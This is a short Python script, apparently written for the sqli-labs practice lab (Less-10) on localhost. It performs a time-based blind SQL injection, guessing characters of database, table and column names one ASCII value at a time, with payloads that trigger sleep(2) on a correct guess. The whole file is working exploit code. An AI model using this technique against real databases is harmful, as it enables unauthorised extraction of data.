import requests
import time

url = 'http://127.0.0.1/sqli-labs-master/Less-10/?id=1'

database = 'select schema_name from information_schema.schemata'
table = 'select table_name from information_schema.tables where table_schema=database()'
column = 'select column_name from information_schema.columns where table_name = "table_name"'

result = ''

for i in range(1,30):           # i 代表取数据库名、表名、字段名的第几个字符，最大30
    for j in range(48,122):     # j 代表ascii码
        payload = '"and if(ascii(substr(({} limit 1,1),{},1))={},sleep(2),1)--+'.format(database,i,j)
        stime = time.time()
        r=requests.get(url+payload)
        print(url+payload)
        etime = time.time()
        if etime - stime >=2:
            result += chr(j)
            print(result)
            break